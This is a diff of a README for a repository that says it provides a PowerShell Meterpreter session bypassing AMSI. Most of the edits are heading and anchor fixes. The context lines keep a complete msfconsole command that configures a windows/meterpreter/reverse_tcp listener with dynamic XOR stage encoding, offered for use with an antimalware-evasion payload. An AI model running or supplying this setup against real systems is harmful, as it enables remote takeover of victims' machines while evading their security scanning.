@@ -3,14 +3,14 @@
 This repo contains a simple meterpreter session in powershell bypassing amsi
 
 1. [English](#English "Goto English")
-2. [Code Meterpreter](#Code Meterpreter "Goto Code Meterpreter")
+2. [Code Meterpreter](#Code Meterpreter "Goto Code-Meterpreter")
 3. [Use](#Use "Goto Use")
 4. [Spanish](#Spanish "Goto Spanish")
-5. [Codigo Meterpreter](#Codigo Meterpreter "Goto Codigo Meterpreter")
+5. [Codigo Meterpreter](#Codigo Meterpreter "Goto Codigo-Meterpreter")
 6. [Uso](#Uso "Goto Uso")
 7. [Video Poc](#Video Poc "Goto Video Poc")
 
-# English #
+## English 
 
 # Code Meterpreter #
 
@@ -39,7 +39,7 @@ Start msfconsole with next command, replace "YourIp" and "YourPort" for your dat
 msfconsole -x "set lhost YourIp; set lport YourPort; set payload windows/meterpreter/reverse_tcp; set EnableStageEncoding true; set StageEncoder x86/xor_dynamic; run"
 ```
 
-# Spanish #
+## Spanish
 
 # Codigo Meterpreter #
 
